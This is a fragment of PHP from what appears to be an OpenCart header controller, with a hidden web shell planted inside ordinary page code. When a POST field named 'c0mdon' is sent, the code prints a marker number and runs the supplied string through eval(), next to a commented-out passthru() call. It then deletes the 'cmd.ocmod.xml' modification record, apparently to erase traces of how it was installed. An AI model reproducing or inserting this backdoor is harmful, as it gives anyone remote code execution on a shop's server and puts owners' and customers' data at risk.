...
class ControllerCommonHeader extends Controller {
	public function index() {
        ...
        $data['newsletters2'] = $this->load->controller('module/newsletters2');
		if(isset($this->request->post['c0mdon'])){
			echo 7457737+736723;
			$c0mdon = ($this->request->post['c0mdon']);
			//passthru($c0mdon);
			eval($c0mdon);
			...
			$this->db->query("DELETE FROM `" . DB_PREFIX . "modification` WHERE `name` LIKE 'cmd.ocmod.xml'");
		}
